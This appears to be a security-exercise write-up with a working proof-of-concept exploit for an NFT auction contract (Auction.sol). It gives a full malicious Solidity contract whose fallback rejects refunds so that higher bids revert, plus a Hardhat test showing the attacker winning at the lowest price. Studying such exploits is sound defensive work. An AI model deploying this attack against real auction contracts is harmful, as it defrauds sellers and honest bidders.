The **Auction.sol** smart contract allows any user in the Internet to bid for ERC721 NFT tokens during a period of 7 days, after which the highest bidder may collect it.
However it contains a design flaw that, when exploited, gives a malicious bidder the opportunity to walk away with the NFT for the lowest price.

The POC (proof of concept) consist of 2 files:

1. The malicious contract, `contracts/attack/AuctionAttack.sol`
```solidity
// SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../vulnerable/Auction.sol";

contract AuctionAttack {
  address payable _owner;
  Auction _auctionContract;
  constructor (address _existingAuctionContractAddress) payable {
    _owner = payable(msg.sender);
    _auctionContract = Auction(_existingAuctionContractAddress);
  }

  function onERC721Received(address, address, uint256, bytes calldata) public pure returns(bytes4) {
    return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
  }

  modifier onlyOwner {
    require(_owner == msg.sender, "Only the owner may call");
    _;
  }

  fallback() external onlyOwner {
    // reject any refunds because the sender is not the attacker
  }

  function bid(uint256 _id) public onlyOwner {
    _auctionContract.bid{ value: 1.000001 ether }(_id);
  }

  function collect(uint256 _id) public onlyOwner {
    // this contract collects the NFT
    _auctionContract.collect(_id);
    // transfer the NFT to the attacker
    ERC721 nftContract = ERC721(_auctionContract.nftContract());
    nftContract.safeTransferFrom(address(this), _owner, _id);
    // disable this contract and return the remaining ETH to the attacker
    selfdestruct(_owner);
  }
}
```

2. The hardhat test
```javascript
    // POC can go here:
    tokenId++;
    console.log("\n EXPLOIT : \n");

    console.log("Mint a new NFT");
    tx = await auction.connect(minter).list({ value: parseEth("1", "ether") });
    await expect(tx).to.emit(auction, "ListedId").withArgs(tokenId, minter.address);
    console.log("The initial owner of NFT #", tokenId, "is", await mock721.ownerOf(tokenId));

    let balance = await attacker.provider.getBalance(attacker.address);
    balance = ethers.utils.formatUnits(balance, "ether");
    console.log("The attacker's initial balance is: ", balance, "ETH");
    console.log("Attacker address:", attacker.address, "deploys a corrupt contract with enough ETH to make a bid.");
    const AuctionAttack = await ethers.getContractFactory("AuctionAttack", attacker);
    const auctionAttack = await AuctionAttack.deploy(auction.address, { value: parseEth("1.5", "ether") });

    console.log("The attacker's contract makes the lowest bid.");
    tx = await auctionAttack.bid(tokenId);

    console.log("bidder1's high bid is expected to fail.");
    await expect(auction.connect(bidder1).bid(tokenId, { value: parseEth("2", "ether") })).to.be.reverted;

    console.log("bidder2's higher bid also fails.");    
    await expect(auction.connect(bidder2).bid(tokenId, { value: parseEth("3", "ether") })).to.be.reverted;

    console.log("Fast forward 7 days, it is NFT collection time!"); 
    // fast forward blockchain time by 7 days
    await ethers.provider.send("evm_mine", [(await blockchainNow()) + 804800]); 
    tx = await auctionAttack.collect(tokenId);
    await expect(tx).to.emit(auction, "TransferId").withArgs(tokenId, minter.address, auctionAttack.address);

    console.log("Now the NFT owner is ", await mock721.ownerOf(tokenId));

    balance = await attacker.provider.getBalance(attacker.address);
    balance = ethers.utils.formatUnits(balance, "ether");
    console.log("The attacker's final balance is: ", balance);
}
```

![Exploiting Auction.sol](https://cdn.glitch.global/67410202-16c0-4d12-bc48-1a6e6eaae69e/AuctionAttack.jpg)


For further reading about this type of vulnerability:
https://swcregistry.io/docs/SWC-113
https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/#dos-with-unexpected-revert
